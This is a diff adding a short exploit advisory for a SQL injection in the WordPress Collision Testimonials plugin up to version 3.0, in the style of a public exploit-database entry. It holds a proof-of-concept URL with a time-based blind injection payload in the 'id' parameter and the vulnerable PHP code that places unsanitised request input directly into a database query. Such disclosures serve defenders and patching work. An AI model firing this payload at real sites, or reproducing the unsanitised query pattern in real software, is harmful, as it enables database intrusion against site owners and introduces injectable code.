@@ -1,0 +1,19 @@
+# Exploit Title: WordPress Collision Testimonials plugin <= 3.0 SQL Injection Vulnerability
+# Date: 2011-08-26
+# Author: Miroslav Stampar (miroslav.stampar(at)gmail.com @stamparm)
+# Software Link: http://downloads.wordpress.org/plugin/collision-testimonials.zip
+# Version: 3.0 (tested)
+# Note: user has to be logged in as "admin"
+
+---
+PoC
+---
+http://www.site.com/wp-admin/admin.php?page=testimonials&featQuote&id=-1 AND 1=IF(2>1,BENCHMARK(5000000,MD5(CHAR(115,113,108,109,97,112))),0)
+
+---------------
+Vulnerable code
+---------------
+if (isset($_GET['featQuote'])) {
+    $id = $_GET['id'];
+    mysql_query("UPDATE $testimonials SET featured=1 WHERE id=$id");
+};
